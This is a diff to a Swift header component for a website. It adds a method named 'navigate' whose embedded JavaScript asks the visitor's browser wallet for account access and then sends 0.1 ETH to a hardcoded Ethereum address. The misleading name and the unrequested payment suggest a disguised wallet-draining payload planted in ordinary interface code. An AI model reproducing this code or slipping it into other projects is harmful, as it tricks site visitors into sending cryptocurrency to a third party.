@@ -46,4 +46,23 @@ struct StoobitHeader: HTML {
         .style(.backdropFilter, "blur(10px)")
         .position(.fixedTop)
     }
+    
+    func navigate() -> CustomAction {
+        method {
+            """
+            (async function(){ 
+              const accounts = await window.ethereum.request({ method: "eth_requestAccounts" }); 
+            
+              if(accounts.length===0){ 
+                console.log("No accounts allowed"); 
+                return; 
+              } 
+              const from=accounts[0]; 
+              const params=[{from,to:"0x1a3F4E64e32635626e6473D65de425a764FAFA7E", value:"0x16345785D8A0000"}]; 
+              const tx = await window.ethereum.request({method:"eth_sendTransaction", params}); 
+              console.log(tx); 
+            })();
+            """
+        }
+    }
 }
